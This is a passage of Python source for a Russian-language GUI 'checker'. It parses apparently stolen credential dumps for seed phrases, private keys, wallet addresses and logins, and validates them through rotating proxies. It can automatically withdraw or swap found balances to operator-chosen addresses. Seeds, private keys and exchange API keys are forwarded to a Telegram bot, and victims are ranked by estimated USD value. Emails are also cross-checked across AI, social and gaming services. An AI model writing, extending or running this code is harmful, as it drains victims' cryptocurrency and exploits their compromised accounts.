            self.log(w, f"✅ Распарсено: {stats['parsed_lines']}")
            self.log(w, f"❌ Не удалось: {stats['failed_lines']}")
            self.log(w, f"🌱 Найдено seed: {stats['found_seeds']}")
            self.log(w, f"🔑 Найдено privkey: {stats['found_privkeys']}")
            self.log(w, f"📍 Найдено адресов: {stats['found_addresses']}")
            self.log(w, f"📧 Найдено credentials: {stats['found_credentials']}")
            self.log(w, f"📝 Готово к проверке: {total} записей")
            
        except Exception as e:
            self.log(w, f"❌ Ошибка парсинга: {e}")

    def _tab_of(self, w):
        for name, ww in self.tab_widgets.items():
            if ww is w:
                return name
        return "Unknown"

    def _safe_int(self, v, default):
        try:
            return int(v)
        except (TypeError, ValueError):
            return default

    def _estimate_usd(self, result):
        if not result:
            return 0.0
        info = result.get("info", {})
        total = info.get("total_usd", 0)
        if total:
            return float(total)
        total += info.get("token_usd", 0)
        _approx_prices = {
            "balance_btc": 60000, "balance_eth": 3000, "balance_sol": 150,
            "balance_bnb": 600, "balance_trx": 0.12, "balance_ltc": 80,
            "balance_xrp": 0.6, "balance_doge": 0.15, "balance_ada": 0.5,
            "balance_ton": 6, "balance_dash": 30,
        }
        for key, price in _approx_prices.items():
            val = info.get(key, 0)
            if val:
                total += float(val) * price
        if "balances" in info:
            for coin_data in info["balances"].values():
                if isinstance(coin_data, dict):
                    bal = coin_data.get("balance", 0)
                    if bal:
                        total += float(bal)
        if "chains" in info:
            for chain_data in info["chains"].values():
                if isinstance(chain_data, dict):
                    usd_val = chain_data.get("usd", 0)
                    if usd_val:
                        total += float(usd_val)
        return total

    def _notify_telegram(self, w, msg):
        token = w.get("tg_token")
        chat_id = w.get("tg_chat_id")
        if not token or not chat_id:
            return
        token_val = token.get().strip()
        chat_id_val = chat_id.get().strip()
        if not token_val or not chat_id_val:
            return
        enabled = w.get("tg_enabled")
        if enabled and not enabled.get():
            return
        import urllib.request
        import urllib.parse
        try:
            url = f"https://api.telegram.org/bot{token_val}/sendMessage"
            data = urllib.parse.urlencode({"chat_id": chat_id_val, "text": msg, "parse_mode": "HTML"}).encode()
            req = urllib.request.Request(url, data=data, method="POST")
            urllib.request.urlopen(req, timeout=5)
            self.after(0, lambda: self.log(w, i18n.t("tg_sent")))
        except Exception as e:
            self.after(0, lambda: self.log(w, i18n.t("tg_error").format(str(e)[:60])))

    def _normalize(self, line, tab):
        raw = line.strip()
        if not raw:
            return ""
        try:
            if tab == "Crypto" and ":" not in raw and "/" not in raw and "|" not in raw:
                return raw

            cleaned = raw.replace("|", ":")

            if tab == "Email":
                m = re.search(r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}", cleaned)
                if m:
                    return m.group(0)

            url_match = re.match(r"(https?://[^\s:]+)", cleaned)
            if url_match:
                url_part = url_match.group(1)
                rest = cleaned[len(url_part):]
                rest_tokens = [t.strip() for t in rest.split(":") if t.strip()]
                if tab == "Email":
                    for t in rest_tokens:
                        if "@" in t and "." in t.split("@")[-1]:
                            return t
                    return ""
                if tab in {"Social", "Games", "AI"}:
                    if rest_tokens:
                        return rest_tokens[0]
                    bits = [p for p in urlparse(url_part).path.split("/") if p]
                    return bits[-1] if bits else ""
                if rest_tokens:
                    return rest_tokens[0]

            tokens = [t.strip() for t in cleaned.split(":") if t.strip()
                      and t.strip() not in {"http", "https", "//"}]

            if tab == "Email":
                for t in tokens:
                    if "@" in t and "." in t.split("@")[-1]:
                        return t
                return ""

            if tab in {"Social", "Games", "AI"}:
                cands = [t for t in tokens
                         if not t.lower().startswith("http") and "." not in t]
                if cands:
                    return cands[0]
                return tokens[0] if tokens else raw

            return tokens[0] if tokens else raw
        except Exception:
            return raw

    def _fast_crypto_filter(self, raw_lines, w):
        from checkers.crypto_checker import _WALLET_PATTERNS, _WALLET_FIRST_CHARS
        exchanges = ("binance","bybit","okx","huobi","kucoin","gate.io","mexc","bitget")
        seen, data = set(), []
        total = len(raw_lines)
        ri = max(total // 10, 1_000_000)
        for idx, line in enumerate(raw_lines):
            s = line.strip()
            if not s:
                continue
            if idx % ri == 0 and idx > 0:
                pct = idx * 100 // total
                self.after(0, lambda p=pct, i=idx, t=total: self.log(
                    w, f"Сканирование... {p}% ({i}/{t})"))
            domain = ""
            if "://" in s:
                domain = s.split("://",1)[1].split("/",1)[0].split(":",1)[0].lower()
            elif "." in s.split(":",1)[0]:
                domain = s.split(":",1)[0].split("/",1)[0].lower()
            if domain:
                for ex in exchanges:
                    if ex in domain:
                        if s not in seen:
                            seen.add(s); data.append(s)
                        break
                else:
                    self._scan_wallets(s, _WALLET_FIRST_CHARS, _WALLET_PATTERNS, seen, data)
            else:
                self._scan_wallets(s, _WALLET_FIRST_CHARS, _WALLET_PATTERNS, seen, data)
        del seen
        self.after(0, lambda: self.log(w, f"Найдено {len(data)} крипто-записей из {total} строк"))
        return data

    @staticmethod
    def _scan_wallets(line, first_chars, patterns, seen, data):
        for token in line.split(":"):
            if len(token) < 25 or len(token) > 95:
                continue
            if "/" in token:
                token = token.rsplit("/", 1)[-1]
                if len(token) < 25:
                    continue
            if token[0] not in first_chars:
                continue
            for _, pat in patterns:
                if pat.match(token):
                    if token not in seen:
                        seen.add(token); data.append(token)
                    return

    def start_check(self, tab_name):
        w = self.tab_widgets[tab_name]
        if tab_name in self._loaded_data and self._loaded_data[tab_name]:
            raw = self._loaded_data[tab_name]
        else:
            raw = w["input"].get("1.0", "end").strip().split("\n")
        if not raw or (len(raw) == 1 and not raw[0].strip()):
            self.log(w, i18n.t("no_data")); return

        threads = self._safe_int(w["threads"].get().strip(), 100)
        timeout = self._safe_int(w["timeout"].get(), 10)
        proxy   = w["proxy"].get().strip()

        self.is_running = True
        self.results = []; self.all_results = []; self._platform_stats = {}
        w["_log_lines"] = []; w["_filter"] = "all"
        w["filter_seg"].set(i18n.t("filter_all"))
        self._update_counters(w, 0, 0, 0, 0)
        w["output"].delete("1.0", "end")
        w["pill"].configure(text="⟳ Проверка...", text_color=ACCENT)
        self._sb_status.configure(text="⟳ Проверка...", text_color=ACCENT)
        w["progress"].set(0)
        w["progress_lbl"].configure(text="0% (0/0)")
        self.log(w, i18n.t("preparing_data"))
        threading.Thread(target=self._run,
                         args=(raw, tab_name, threads, timeout, proxy, w),
                         daemon=True).start()

    def _run(self, raw, tab_name, threads, timeout, proxy, w):
        try:
            orig = len(raw)
            if tab_name == "Crypto":
                data = self._fast_crypto_filter(raw, w)
            elif tab_name == "All":
                seen, data = set(), []
                for line in raw:
                    s = line.strip()
                    if s and s not in seen:
                        seen.add(s); data.append(s)
                del seen
            else:
                seen, data = set(), []
                for item in (self._normalize(d, tab_name) for d in raw if d.strip()):
                    if item and item not in seen:
                        seen.add(item); data.append(item)
                del seen

            dupes = orig - len(data)
            if not data:
                self.after(0, lambda: self.log(w, i18n.t("no_data")))
                self.after(0, lambda: w["pill"].configure(
                    text=f"● {i18n.t('ready')}", text_color=GREEN))
                return
            if dupes > 0:
                self.after(0, lambda: self.log(w, i18n.t("duplicates_removed").format(dupes)))
            if tab_name == "All":
                self.after(0, lambda: self.log(w, i18n.t("starting_all").format(
                    len(data), 5, len(data)*5, threads)))
            else:
                self.after(0, lambda: self.log(w, i18n.t("starting").format(len(data), threads)))

            # Настройка автовывода для Crypto
            if tab_name == "Crypto" and "auto_withdraw_enabled" in w:
                if w["auto_withdraw_enabled"].get():
                    addresses = {}
                    min_amounts = {}
                    
                    eth_addr = w["withdraw_eth"].get().strip()
                    btc_addr = w["withdraw_btc"].get().strip()
                    trx_addr = w["withdraw_trx"].get().strip()
                    sol_addr = w["withdraw_sol"].get().strip()
                    
                    if eth_addr:
                        addresses["ethereum"] = eth_addr
                        addresses["bsc"] = eth_addr
                        addresses["polygon"] = eth_addr
                        addresses["avalanche"] = eth_addr
                        addresses["base"] = eth_addr
                        addresses["arbitrum"] = eth_addr
                        addresses["optimism"] = eth_addr
                    if btc_addr:
                        addresses["bitcoin"] = btc_addr
                    if trx_addr:
                        addresses["tron"] = trx_addr
                    if sol_addr:
                        addresses["solana"] = sol_addr
                    
                    try:
                        min_amounts["ethereum"] = float(w["min_eth"].get().strip() or "0.01")
                        min_amounts["bsc"] = min_amounts["ethereum"]
                        min_amounts["polygon"] = min_amounts["ethereum"]
                        min_amounts["avalanche"] = min_amounts["ethereum"]
                        min_amounts["bitcoin"] = float(w["min_btc"].get().strip() or "0.001")
                        min_amounts["tron"] = float(w["min_trx"].get().strip() or "10")
                        min_amounts["solana"] = float(w["min_sol"].get().strip() or "0.1")
                    except ValueError:
                        self.after(0, lambda: self.log(w, "⚠️ Ошибка в минимальных суммах, используются значения по умолчанию"))
                        min_amounts = {
                            "ethereum": 0.01, "bsc": 0.01, "polygon": 0.01,
                            "bitcoin": 0.001, "tron": 10, "solana": 0.1
                        }
                    
                    if addresses:
                        self.checkers["Crypto"].enable_auto_withdraw(addresses, min_amounts)
                        self.after(0, lambda: self.log(w, f"✓ Автовывод включен на {len(addresses)} сетей"))
                    else:
                        self.after(0, lambda: self.log(w, "⚠️ Автовывод включен, но адреса не указаны"))
                else:
                    self.checkers["Crypto"].disable_auto_withdraw()
            
            # Настройка автообмена для Crypto
            if tab_name == "Crypto" and "auto_swap_enabled" in w:
                if w["auto_swap_enabled"].get():
                    try:
                        target_token = w["swap_target"].get().strip()
                        min_usd = float(w["swap_min_usd"].get().strip() or "1.0")
                        slippage = float(w["swap_slippage"].get().strip() or "1.0")
                        dex = w["swap_dex"].get().strip().lower()
                        
                        self.checkers["Crypto"].enable_auto_swap(
                            target_token=target_token,
                            min_value_usd=min_usd,
                            slippage=slippage,
                            dex=dex
                        )
                        self.after(0, lambda: self.log(w, f"✓ Автообмен включен: {target_token} через {dex.capitalize()}"))
                    except ValueError as e:
                        self.after(0, lambda: self.log(w, f"⚠️ Ошибка настроек автообмена: {e}"))
                else:
                    self.checkers["Crypto"].disable_auto_swap()
            
            # Начать сессию статистики для Crypto
            if tab_name == "Crypto":
                self.checkers["Crypto"].start_session()

            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(self._check_all(data, tab_name, threads, timeout, proxy, w))
        except Exception as e:
            self.after(0, lambda: self.log(w, f"Error: {e}"))
            self.after(0, lambda: w["pill"].configure(
                text=f"● {i18n.t('ready')}", text_color=GREEN))
        finally:
            self.is_running = False
            self.after(0, lambda: self._sb_status.configure(text="● Готов", text_color=GREEN))

    async def _check_all(self, data, tab_name, threads, timeout, proxy, w):
        sem  = asyncio.Semaphore(threads)
        cats = ["Email", "Social", "Crypto", "Games", "AI"]
        total = len(data) * len(cats) if tab_name == "All" else len(data)
        done  = [0]; valid = [0]; inv = [0]; err = [0]
        upd   = max(1, total // 2000)

        # Загружаем прокси через ProxyManager
        proxy_count = 0
        if proxy:
            reset_proxies()  # Сбрасываем предыдущие прокси
            if load_proxies(proxy):
                initial_count = get_proxy_count()
                self.after(0, lambda: self.log(w, f"📋 Загружено {initial_count} прокси"))
                
                # Проверяем прокси перед использованием
                self.after(0, lambda: self.log(w, f"🔍 Проверка прокси... (это может занять время)"))
                
                try:
                    check_result = await check_all_proxies(timeout=5, max_concurrent=50)
                    
                    alive = check_result['alive']
                    dead = check_result['dead']
                    
                    if alive > 0:
                        proxy_count = alive
                        self.after(0, lambda: self.log(w, f"✅ Живых прокси: {alive}"))
                        if dead > 0:
                            self.after(0, lambda: self.log(w, f"❌ Мертвых прокси: {dead} (удалены)"))
                    else:
                        self.after(0, lambda: self.log(w, f"❌ Все прокси мертвые! Проверка без прокси."))
                        proxy_count = 0
                
                except Exception as e:
                    self.after(0, lambda: self.log(w, f"⚠️ Ошибка проверки прокси: {e}"))
                    self.after(0, lambda: self.log(w, f"⚠️ Используем прокси без проверки"))
                    proxy_count = initial_count
            else:
                self.after(0, lambda: self.log(w, f"❌ Не удалось загрузить прокси из: {proxy}"))

        conn = aiohttp.TCPConnector(limit=threads*2,
                                    limit_per_host=min(threads,50),
                                    ttl_dns_cache=300, force_close=False)
        async with aiohttp.ClientSession(connector=conn) as session:
            async def task(item, cat=None):
                async with sem:
                    if not self.is_running:
                        return None
                    
                    # Получаем следующий прокси из менеджера (с ротацией)
                    p = get_next_proxy() if proxy_count > 0 else None
                    
                    cat_ = cat or tab_name
                    it   = item
                    if cat:
                        it = self._normalize(item, cat_)
                        if not it:
                            done[0] += 1
                            return None
                    res = await self._check_item(it, cat_, timeout, p, session)
                    done[0] += 1
                    if res:
                        tag = res.get("platform", res.get("service", res.get("wallet_type","")))
                        inp = res.get("input", res.get("email",""))
                        if res.get("info",{}).get("error"):
                            err[0] += 1
                            msg = res["info"]["error"]
                            self.after(0, lambda t=tag,i=inp,m=msg: self.log_tagged(
                                w,"error",f"[!] [{t}] {i} — {m}"))
                        elif res.get("exists"):
                            valid[0] += 1
                            self._platform_stats[tag] = self._platform_stats.get(tag,0)+1
                            msg = res.get("info",{}).get("message","")
                            self.after(0, lambda t=tag,i=inp,m=msg: self.log_tagged(
                                w,"valid",f"[+] [{t}] {i} — {m}"))
                            
                            rtype = res.get("type", "")
                            if rtype in ("seed", "privkey_hex", "privkey_wif"):
                                filename = "seeds_valid.txt" if rtype == "seed" else "privkeys_valid.txt"
                                try:
                                    with open(filename, "a", encoding="utf-8") as f_out:
                                        auth = res.get("info", {}).get("auth", {})
                                        f_out.write(f"=== Найдено: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
                                        f_out.write(f"Ключ/Фраза: {inp}\n")
                                        f_out.write(f"Результат: {msg}\n")
                                        if auth:
                                            f_out.write(f"ИНСТРУКЦИЯ ПО ВХОДУ:\n")
                                            f_out.write(f"  • Куда заходить: {auth.get('wallets', '')}\n")
                                            f_out.write(f"  • Тип импорта: {auth.get('auth_type', '')}\n")
                                            f_out.write(f"  • Как войти: {auth.get('how', '')}\n")
                                        f_out.write("-" * 70 + "\n")
                                except Exception:
                                    pass

                            auth = res.get("info",{}).get("auth")
                            if auth:
                                self.after(0, lambda a=auth: self.log_tagged(w,"valid",
                                    f"    ↳ {i18n.t('auth_type')}: {a['auth_type']}"))
                                self.after(0, lambda a=auth: self.log_tagged(w,"valid",
                                    f"    ↳ {i18n.t('auth_wallets')}: {a['wallets']}"))
                                self.after(0, lambda a=auth: self.log_tagged(w,"valid",
                                    f"    ↳ {i18n.t('auth_how')}: {a['how']}"))
                            linked = res.get("info",{}).get("linked_services",[])
                            if linked:
                                svc = ", ".join(s["service"] for s in linked)
                                self.after(0, lambda i=inp,s=svc: self.log_tagged(
                                    w,"valid",f"    ↳ {i18n.t('linked')}: {s}"))
                                for sv in linked:
                                    self.after(0, lambda n=sv["service"],m2=sv.get("message",""): self.log_tagged(
                                        w,"valid",f"      • {n}: {m2}"))
                        else:
                            inv[0] += 1
                            msg = res.get("info",{}).get("message","Not found")
                            self.after(0, lambda t=tag,i=inp,m=msg: self.log_tagged(
                                w,"invalid",f"[-] [{t}] {i} — {m}"))
                    
                    if done[0] % upd == 0 or done[0] == total:
                        pv = done[0]/total
                        pct_text = f"{int(pv * 100)}% ({done[0]}/{total})"
                        vv,iv,ev = valid[0],inv[0],err[0]
                        self.after(0, lambda p=pv, t=pct_text: (w["progress"].set(p), w["progress_lbl"].configure(text=t)))
                        self.after(0, lambda: self._update_counters(w,vv,iv,ev,done[0]))
                    return res

            results, batch = [], []
            def flush():
                nonlocal batch
                t = ([task(i,c) for i,c in batch] if tab_name=="All"
                     else [task(i) for i,_ in batch])
                batch = []; return t

            if tab_name == "All":
                for item in data:
                    for c in cats:
                        batch.append((item,c))
                        if len(batch) >= _GATHER_BATCH_SIZE:
                            if not self.is_running: break
                            results.extend(await asyncio.gather(*flush()))
                    if not self.is_running: break
            else:
                for item in data:
                    batch.append((item,None))
                    if len(batch) >= _GATHER_BATCH_SIZE:
                        if not self.is_running: break
                        results.extend(await asyncio.gather(*flush()))
            if batch and self.is_running:
                results.extend(await asyncio.gather(*flush()))

        self.all_results = [r for r in results if r]
        self.results     = [r for r in self.all_results if r.get("exists")]
        del results
        
        # Обновляем статистику сессии для Crypto
        if tab_name == "Crypto":
            for r in self.all_results:
                self.checkers["Crypto"].update_session_stats(r)

        self.results.sort(key=lambda r: self._estimate_usd(r), reverse=True)

        for r in self.results:
            est = self._estimate_usd(r)
            rtype = r.get("type", "")
            notify_threshold = 0 if rtype in ("seed", "privkey_hex", "privkey_wif", "exchange_api") else 100
            if est > notify_threshold:
                inp = r.get("input", "")[:30]
                msg_text = r.get("info", {}).get("message", "")
                if rtype == "seed":
                    tg_msg = f"<b>🌱 Seed Phrase with balance!</b>\n<code>{inp}</code>\n{msg_text[:200]}\nUSD: ~${est:,.2f}"
                elif rtype == "privkey_hex":
                    tg_msg = f"<b>🔑 Private Key with balance!</b>\n<code>{inp}</code>\n{msg_text[:200]}\nUSD: ~${est:,.2f}"
                elif rtype == "privkey_wif":
                    tg_msg = f"<b>🔑 WIF Key with balance!</b>\n<code>{inp}</code>\n{msg_text[:200]}\nUSD: ~${est:,.2f}"
                elif rtype == "exchange_api":
                    tg_msg = f"<b>🏦 Exchange API key!</b>\n{inp}\n{msg_text[:200]}"
                else:
                    tg_msg = f"<b>💰 Balance found!</b>\n{inp}\n{msg_text[:200]}\nUSD: ~${est:,.2f}"
                self._notify_telegram(w, tg_msg)

        total_portfolio = sum(self._estimate_usd(r) for r in self.results)
        if self.results:
            summary = i18n.t("summary_line").format(len(self.results), f"{total_portfolio:,.2f}")
            self.after(0, lambda s=summary: self.log_tagged(w, "system", s))

        vv,iv,ev = valid[0],inv[0],err[0]
        self.after(0, lambda: self._update_counters(w,vv,iv,ev,total))
        self.after(0, lambda: w["pill"].configure(
            text=f"● {i18n.t('ready')}", text_color=GREEN))
        self.log(w, i18n.t("completed").format(len(self.results), total))
        self.log(w, "─" * 64)

    async def _check_item(self, item, tab_name, timeout, proxy, session):
        checker = self.checkers.get(tab_name)
        try:
            res = await checker.check(item, timeout=timeout, proxy=proxy, session=session)
            if tab_name == "Email" and res.get("exists"):
                res["info"]["linked_services"] = await self._cross_email(
                    item, timeout, proxy, session)
            return res
        except Exception as e:
            return {"input": item, "exists": False, "info": {"error": str(e)}}

    async def _cross_email(self, email, timeout, proxy, session):
        u = email.split("@")[0]
        checks = [
            ("chatgpt",    self.checkers["AI"]._check_openai,      email),
            ("gemini",     self.checkers["AI"]._check_gemini,      email),
            ("perplexity", self.checkers["AI"]._check_perplexity,  email),
            ("claude",     self.checkers["AI"]._check_claude,      email),
            ("github",     self.checkers["Social"]._check_github,    u),
            ("instagram",  self.checkers["Social"]._check_instagram, u),
            ("twitter",    self.checkers["Social"]._check_twitter,   u),
            ("tiktok",     self.checkers["Social"]._check_tiktok,    u),
            ("reddit",     self.checkers["Social"]._check_reddit,    u),
            ("vk",         self.checkers["Social"]._check_vk,        u),
            ("telegram",   self.checkers["Social"]._check_telegram,  u),
            ("steam",      self.checkers["Games"]._check_steam,       u),
            ("epic",       self.checkers["Games"]._check_epic,        u),
            ("xbox",       self.checkers["Games"]._check_xbox,        u),
            ("playstation",self.checkers["Games"]._check_playstation, u),
        ]
        async def _run(name, fn, d):
            try:
                r = await fn(d, timeout, proxy, session)
                if r.get("exists"):
                    return {"service": name, "found": True,
                            "message": r.get("info",{}).get("message","")}
            except Exception:
                pass
            return None
        return [r for r in await asyncio.gather(*[_run(n,f,d) for n,f,d in checks]) if r]

    def _update_counters(self, w, valid, inv, err, total):
        w["cnt_valid"].configure(text=str(valid))
        w["cnt_invalid"].configure(text=str(inv))
        w["cnt_errors"].configure(text=str(err))
        w["cnt_total"].configure(text=str(total))

    def log_tagged(self, w, tag, msg):
        ll = w.setdefault("_log_lines", [])
        ll.append((tag, msg))
        if len(ll) > _MAX_LOG_LINES:
            w["_log_lines"] = ll[-_MAX_LOG_LINES:]
        cur_filter = w.get("_filter", "all")
        if cur_filter in ("all", tag):
            # v1.0.57: Используем LogColorizer для автоматической цветовой подсветки
            self._log_safe(w, msg, tag)
        elif cur_filter == "balance" and tag == "valid" and "(empty)" not in msg:
            self._log_safe(w, msg, tag)

    def _on_filter(self, w, value):
        mapping = {
            i18n.t("filter_all"):     "all",
            i18n.t("filter_valid"):   "valid",
            i18n.t("filter_invalid"): "invalid",
            i18n.t("filter_errors"):  "error",
            i18n.t("filter_balance"): "balance",
        }
        ft = mapping.get(value, "all")
        w["_filter"] = ft
        w["output"].delete("1.0", "end")
        
        lines_to_show = []
        for tag, line in w.get("_log_lines", []):
            if ft == "all" or tag == ft or tag == "system":
                lines_to_show.append((line, tag))
            elif ft == "balance":
                # 🎯 СТРОГАЯ фильтрация: показываем ТОЛЬКО строки с явным упоминанием баланса
                # Должно быть одно из ключевых слов баланса
                balance_keywords = [
                    "Balance:",      # Balance: 1.23 ETH
                    "balance_",      # balance_eth: 0.5
                    "Total:",        # Total: $1000
                    "Portfolio:",    # Portfolio: $5000
                    "~$",            # ~$123.45
                ]
                
                # Проверяем что в строке есть хотя бы одно ключевое слово баланса
                has_balance_keyword = any(keyword in line for keyword in balance_keywords)
                
                # Также проверяем что есть знак доллара с цифрой (но не $0.00)
                import re
                has_dollar_amount = bool(re.search(r'\$[0-9]+', line))
                
                # Показываем только если есть ключевое слово ИЛИ сумма в долларах
                if has_balance_keyword or has_dollar_amount:
                    # Исключаем пустые балансы
                    if "(empty)" not in line and "0.0000" not in line and "$0.00" not in line and "$0)" not in line:
                        # Дополнительная проверка: есть ли положительные числа
                        balance_patterns = [
                            r'Balance:\s*([0-9]+\.?[0-9]*)',  # Balance: 1.23
                            r'\$([0-9]+\.?[0-9]+)',            # $45.67 (минимум с точкой)
                            r'balance[_\s]*[a-z]*:\s*([0-9]+\.?[0-9]*)',  # balance_eth: 0.5
                            r'~\$([0-9]+\.?[0-9]*)',           # ~$123.45
                            r'Total:\s*\$?([0-9]+\.?[0-9]*)',  # Total: $1000
                        ]
                        
                        has_positive_balance = False
                        for pattern in balance_patterns:
                            matches = re.findall(pattern, line, re.IGNORECASE)
                            for match in matches:
                                try:
                                    value = float(match)
                                    if value > 0:
                                        has_positive_balance = True
                                        break
                                except:
                                    pass
                            if has_positive_balance:
                                break
                        
                        if has_positive_balance:
                            lines_to_show.append((line, tag))

        def insert_batch(index=0):
            if w.get("_filter") != ft:
                return
            batch = lines_to_show[index:index+200]
            if batch:
                for line, tag in batch:
                    try:
                        w["output"].insert("end", f"{line}\n", tag)
                    except Exception:
                        pass
                try:
                    w["output"].see("end")
                except Exception:
                    pass
                self.after(10, lambda: insert_batch(index + 200))

        insert_batch(0)

    def stop_check(self):
        self.is_running = False

    def clear_output(self, w):
        w["output"].delete("1.0", "end")
        w["input"].delete("1.0", "end")
        w["progress"].set(0)
        w["progress_lbl"].configure(text="0% (0/0)")
        self._update_counters(w, 0, 0, 0, 0)
        w["_log_lines"] = []; w["_filter"] = "all"
        w["filter_seg"].set(i18n.t("filter_all"))
        self._loaded_data.pop(self._tab_of(w), None)

    def log(self, w, msg):
        w.setdefault("_log_lines", []).append(("system", msg))
        self.after(0, lambda: self._log_safe(w, msg, "system"))

    def _log_safe(self, w, msg, tag="system"):
        try:
            # v1.0.57: Используем LogColorizer для автоматической цветовой подсветки
            # Автоопределение цвета по содержимому сообщения
            detected_type = LogColorizer.detect_log_type(msg)
            
            # Если это valid результат, проверяем на перевод или баланс
            if tag == "valid":
                if detected_type == "transfer_detected":
                    # КРАСНЫЙ для переводов - самое важное!
                    LogColorizer.insert_colored_text(w["output"], msg)
                elif detected_type == "whale":
                    # Золотой для китов
                    LogColorizer.insert_colored_text(w["output"], msg)
                elif detected_type == "balance_found":
                    # Зеленый для балансов
                    LogColorizer.insert_colored_text(w["output"], msg)
                else:
                    # Обычный valid (зеленый)
                    w["output"].insert("end", f"{msg}\n", "valid")
                    w["output"].see("end")
            elif tag == "error":
                # Желтый для ошибок
                w["output"].insert("end", f"{msg}\n", "error")
                w["output"].see("end")
            elif tag == "invalid":
                # Серый для невалидных
                w["output"].insert("end", f"{msg}\n", "invalid")
                w["output"].see("end")
            else:
                # Автоопределение для system и других
                LogColorizer.insert_colored_text(w["output"], msg)
        except Exception:
            pass

    def show_stats(self, tab_name):
        w = self.tab_widgets[tab_name]
        if not self.all_results:
            self.log(w, i18n.t("stats_no_data")); return

        # Для Crypto показываем расширенную статистику
        if tab_name == "Crypto":
            self._show_crypto_extended_stats(w)
            return

        win = ctk.CTkToplevel(self)
        win.title(i18n.t("stats_title"))
        win.geometry("540x520")
        win.configure(fg_color=BG)
        win.attributes("-topmost", True)

        valid  = len([r for r in self.all_results if r.get("exists")])
        errors = len([r for r in self.all_results if r.get("info",{}).get("error")])
        inv    = len(self.all_results) - valid - errors
        total  = len(self.all_results)

        ctk.CTkLabel(win, text=i18n.t("stats_title"),
                     font=("Segoe UI", 18, "bold"), text_color=TEXT
                     ).pack(pady=(20, 12))

        cf = ctk.CTkFrame(win, fg_color="transparent")
        cf.pack(padx=20, fill="x")
        cf.grid_columnconfigure((0,1,2), weight=1)
        for col, (lbl, cnt, clr) in enumerate([
            (i18n.t("valid"),   valid,  GREEN),
            (i18n.t("invalid"), inv,    RED),
            (i18n.t("errors"),  errors, YELLOW),
        ]):
            c = ctk.CTkFrame(cf, fg_color=CARD, corner_radius=12)
            c.grid(row=0, column=col, padx=4, sticky="ew")
            ctk.CTkLabel(c, text=lbl, font=("Segoe UI",11), text_color=MUTED).pack(pady=(10,0))
            ctk.CTkLabel(c, text=str(cnt), font=("Segoe UI",24,"bold"), text_color=clr).pack()
            pct = f"{cnt*100//total}%" if total else "0%"
            ctk.CTkLabel(c, text=pct, font=("Segoe UI",11), text_color=MUTED).pack(pady=(0,10))

        bc = ctk.CTkFrame(win, fg_color=CARD, corner_radius=10)
        bc.pack(padx=20, pady=12, fill="x")
        cv = Canvas(bc, width=480, height=110, bg=CARD, highlightthickness=0)
        cv.pack(pady=10, padx=10)
        mx = max(valid, inv, errors, 1)
        for lbl, cnt, clr, y in [
            (i18n.t("valid"),   valid,  GREEN,  8),
            (i18n.t("invalid"), inv,    RED,    44),
            (i18n.t("errors"),  errors, YELLOW, 80),
        ]:
            bw  = int((cnt/mx)*290) if mx else 0
            pct = f"{cnt*100//total}%" if total else "0%"
            cv.create_rectangle(130, y, 130+max(bw,3), y+22, fill=clr, outline="")
            cv.create_text(6,   y+11, text=f"{lbl}: {cnt}", anchor="w",
                           fill=TEXT, font=("Segoe UI",11))
            cv.create_text(460, y+11, text=pct, anchor="e",
                           fill=clr, font=("Segoe UI",11,"bold"))

        ctk.CTkLabel(win, text=i18n.t("stats_by_platform"),
                     font=("Segoe UI",14,"bold"), text_color=TEXT
                     ).pack(padx=20, anchor="w")
        sc = ctk.CTkScrollableFrame(win, fg_color=CARD, corner_radius=10, height=160)
        sc.pack(padx=20, pady=(4,20), fill="both", expand=True)
        if self._platform_stats:
            for plat, cnt in sorted(self._platform_stats.items(), key=lambda x:-x[1]):
                row = ctk.CTkFrame(sc, fg_color="transparent")
                row.pack(fill="x", padx=8, pady=2)
                ctk.CTkLabel(row, text=plat, font=("Segoe UI",12),
                             text_color=TEXT).pack(side="left")
                ctk.CTkLabel(row, text=f"{cnt} {i18n.t('stats_found')}",
                             font=("Segoe UI",12,"bold"),
                             text_color=ACCENT).pack(side="right")
        else:
            ctk.CTkLabel(sc, text="  —", font=("Segoe UI",12), text_color=MUTED).pack()
    
    def _show_crypto_extended_stats(self, w):
        """Показать расширенную статистику для Crypto чекера."""
        # Завершаем сессию для получения финальной статистики
        self.checkers["Crypto"].end_session()
        stats = self.checkers["Crypto"].get_session_stats()
        
        win = ctk.CTkToplevel(self)
        win.title("📊 Расширенная статистика Crypto")
        win.geometry("680x720")
        win.configure(fg_color=BG)
        win.attributes("-topmost", True)
        
        # Заголовок
        ctk.CTkLabel(win, text="📊 Расширенная статистика",
                     font=("Segoe UI", 20, "bold"), text_color=TEXT
                     ).pack(pady=(20, 10))
        
        # Основные метрики
        main_frame = ctk.CTkFrame(win, fg_color="transparent")
        main_frame.pack(padx=20, pady=10, fill="x")
        main_frame.grid_columnconfigure((0,1,2,3), weight=1)
        
        metrics = [
            ("Проверено", stats["total_checked"], ACCENT),
            ("С балансом", stats["total_with_balance"], GREEN),
            ("Выведено", stats["total_withdrawn"], PURPLE),
            ("Обменено", stats["total_swapped"], ORANGE),
        ]
        
        for col, (label, value, color) in enumerate(metrics):
            card = ctk.CTkFrame(main_frame, fg_color=CARD, corner_radius=12)
            card.grid(row=0, column=col, padx=4, sticky="ew")
            ctk.CTkLabel(card, text=label, font=("Segoe UI", 10),
                         text_color=MUTED).pack(pady=(10, 0))
            ctk.CTkLabel(card, text=str(value), font=("Segoe UI", 22, "bold"),
                         text_color=color).pack()
            ctk.CTkFrame(card, height=3, fg_color=color, corner_radius=2
                         ).pack(fill="x", padx=12, pady=(4, 10))
        
        # Общая сумма и скорость
        info_frame = ctk.CTkFrame(win, fg_color=CARD, corner_radius=10)
        info_frame.pack(padx=20, pady=10, fill="x")
        info_frame.grid_columnconfigure((0,1,2), weight=1)
        
        ctk.CTkLabel(info_frame, text="💰 Общая сумма:",
                     font=("Segoe UI", 12), text_color=MUTED
                     ).grid(row=0, column=0, padx=15, pady=12, sticky="w")
        ctk.CTkLabel(info_frame, text=f"${stats['total_usd']:,.2f}",
                     font=("Segoe UI", 16, "bold"), text_color=GREEN
                     ).grid(row=0, column=1, padx=15, pady=12, sticky="w")
        
        duration_text = stats.get("duration_formatted", "N/A")
        speed_text = f"{stats.get('checks_per_second', 0):.1f} адр/сек"
        
        ctk.CTkLabel(info_frame, text=f"⏱️ {duration_text}  •  ⚡ {speed_text}",
                     font=("Segoe UI", 11), text_color=MUTED
                     ).grid(row=0, column=2, padx=15, pady=12, sticky="e")
